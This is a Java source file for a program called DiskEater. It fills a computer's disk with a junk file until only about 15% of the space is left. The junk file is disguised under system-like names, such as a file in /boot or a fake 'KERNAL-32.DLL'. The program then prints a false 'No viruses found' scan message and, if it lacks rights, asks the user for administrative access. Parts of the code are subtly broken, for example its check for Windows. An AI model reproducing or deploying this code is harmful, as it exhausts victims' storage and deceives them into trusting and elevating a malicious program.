
package diskeater;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.file.FileStore;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.text.NumberFormat;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author alex
 */
public class DiskEater {

    /**
     * @param args the command line arguments -c arguement clears the file if it
     * exists
     */
    public static void main(String[] args) {
        boolean verbose = false;
        
        if (getJunkPath().equals("junk")) {
            System.out.println("Operating System not supported.");
        } else {
            File file = new File(getJunkPath());

            // remove file if it already exists
            if (verbose) {
                System.out.println(file.getAbsolutePath());
            }
            if (file.exists()) {
                file.delete();
            }

            // if -c parameter is not given, run full program
            if (args.length < 1 || !args[0].equals("-c")) {
                double fill = .15;
                long available = -1;
                long total = -1;

                //get storage information
                NumberFormat nf = NumberFormat.getNumberInstance();
                for (Path root : FileSystems.getDefault().getRootDirectories()) {

                    if (verbose) {
                        System.out.print(root + ": ");
                    }
                    try {
                        FileStore store = Files.getFileStore(root);
                        if (verbose) {
                            System.out.println("available="
                                    + nf.format(store.getUsableSpace())
                                    + ", total=" + nf.format(store.getTotalSpace()));
                        }
                        available = store.getUsableSpace();
                        total = store.getTotalSpace();
                    } catch (IOException e) {
                        System.out.println("error querying space: " + e.toString());
                    }
                }

                if (verbose) {
                    System.out.println("Disk Space Available: " + (double) available / (double) total);
                }

                writeFile(available, total, fill, file);

                if (verbose) {
                    getSpace();
                }
            }
        }
    }

    /**
     * gets desired path to junk file
     *
     * @return path to file to be saved.
     */
    public static String getJunkPath() {
        if (System.getProperty("os.name").equals("Linux")) {
            return "/boot/config_os-generic";
        } else if (System.getProperty("os.name").equals("Windows")) {
            String root = System.getProperty("user.home");
            return root + "\\Windows\\System32\\KERNAL-32.DLL";
        }
        return "junk";
    }

    /**
     * returns remaining disk space.
     *
     * @return disk space in MB
     */
    public static long getSpace() {
        NumberFormat nf = NumberFormat.getNumberInstance();
        for (Path root : FileSystems.getDefault().getRootDirectories()) {

            System.out.print(root + ": ");
            try {
                FileStore store = Files.getFileStore(root);
                System.out.println("available="
                        + nf.format(store.getUsableSpace())
                        + ", total=" + nf.format(store.getTotalSpace()));
                return (store.getUsableSpace());
            } catch (IOException e) {
                System.out.println("error querying space: " + e.toString());
            }
        }
        return -1;
    }

    /**
     * writes file to fill a certain percent of space using FileOutputStream.
     *
     * @param available bytes that can be written to left on the disk
     * @param total total bytes on disk
     * @param fill percent of disk that will be filled after file is written
     * @param file path to file to be written
     */
    public static void writeFile(long available, long total, double fill, File file) {
        NumberFormat nf = NumberFormat.getNumberInstance();

        // number of bytes written leaving fill% of disk empty
        long write = available - (long) (total * (1 - fill));

        try {

            FileOutputStream s = new FileOutputStream(file);
            // write by .5GB
            for (int i = 500000000; i < write; write -= 500000000) {
                byte[] buf = new byte[500000000];
                s.write(buf);
                s.flush();
            }
            // write by MB
            for (int i = 1000000; i < write; write -= 1000000) {
                byte[] buf = new byte[1000000];
                s.write(buf);
                s.flush();
            }
            // write by KB
            for (int i = 1000; i < write; write -= 1000) {
                byte[] buf = new byte[1000];
                s.write(buf);
                s.flush();
            }
            // write by B
            for (int i = 0; i < write; write -= 1) {
                byte[] buf = new byte[1];
                s.write(buf);
                s.flush();
            }
            System.out.println("Scan complete. No viruses found!");
        } catch (IOException e) {
            System.out.println("Please give me administrative access!\nDidn't "
                    + "do anything");
        }
    }

    /**
     * writes file to fill percent of space using RandomAccessFile.
     *
     * @param size size of file to be written
     * @param fill percent of disk to be filled
     */
    public static void fastWriteFile(long size, double fill) {
        NumberFormat nf = NumberFormat.getNumberInstance();
        long write = (long) (size * fill);
        System.out.println("write = " + nf.format(write));
//        File file = new File("newfile.txt");
        RandomAccessFile f;
        try {
            f = new RandomAccessFile("newfile.txt", "rws");
            f.setLength(write);
        } catch (FileNotFoundException ex) {
            Logger.getLogger(DiskEater.class.getName()).log(Level.SEVERE,
                    null, ex);
        } catch (IOException ex) {
            Logger.getLogger(DiskEater.class.getName()).log(Level.SEVERE,
                    null, ex);
        }
    }

}
